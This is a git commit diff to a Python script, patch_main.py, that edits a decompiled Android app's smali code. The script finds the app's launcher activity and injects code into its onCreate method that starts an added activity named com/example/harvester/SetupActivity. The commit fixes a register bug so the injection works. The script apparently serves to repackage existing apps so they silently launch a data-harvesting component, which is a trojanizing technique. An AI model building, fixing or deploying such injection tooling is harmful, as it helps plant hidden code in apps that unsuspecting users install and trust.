926c3cd33f1e3b1b8fb95a2887357b6971836087
Mointanveerm <mointanveer1008@gmail.com>
2026-08-20 18:58:56 +0500

    Fix Smali launcher patch

--- patch_main.py
+++ patch_main.py
@@ -12,37 +12,49 @@ for m in re.finditer(r"<activity\s+([^>]*)>", mani):
         if n:
             launcher = n.group(1)
             break
+
 if not launcher:
     launcher = re.search(r'<activity[^>]*android:name="([^"]+)"', mani).group(1)
+
 print("LAUNCHER=" + launcher)
 
 cands = glob.glob(vsrc + "/smali*/" + launcher.replace(".", "/") + ".smali")
 assert cands, "launcher smali not found"
+
 path = cands[0]
 s = open(path).read()
 
 m = re.search(r"\.method[^\n]*\bonCreate\(Landroid/os/Bundle;\)V(.*?)\.end method", s, re.S)
 assert m, "onCreate not found in " + path
+
 body = m.group(1)
 
 lm = re.search(r"\.locals (\d+)", body)
 assert lm, "no .locals in onCreate"
+
 n = int(lm.group(1))
-body = body[:lm.start()] + ".locals %d" % (n + 1) + body[lm.end():]
+body = body[:lm.start()] + ".locals %d" % (n + 2) + body[lm.end():]
+
 v = "v%d" % n
+v2 = "v%d" % (n + 1)
 
 block = (
     "\n    new-instance %s, Landroid/content/Intent;\n" % v
-    + "    invoke-direct {%s, p0, Lcom/example/harvester/SetupActivity;}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n" % v
+    + "    const-class %s, Lcom/example/harvester/SetupActivity;\n" % v2
+    + "    invoke-direct {%s, p0, %s}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n" % (v, v2)
     + "    invoke-virtual {p0, %s}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V\n" % v
 )
+
 rv = body.rfind("return-void")
 assert rv != -1, "no return-void in onCreate"
+
 body = body[:rv] + block + body[rv:]
 
 full = m.group(0)
 pre = full[:m.start(1)]
 post = full[m.end(1):]
+
 s = s[:m.start()] + pre + body + post + s[m.end():]
+
 open(path, "w").write(s)
 print("main patched: " + path)
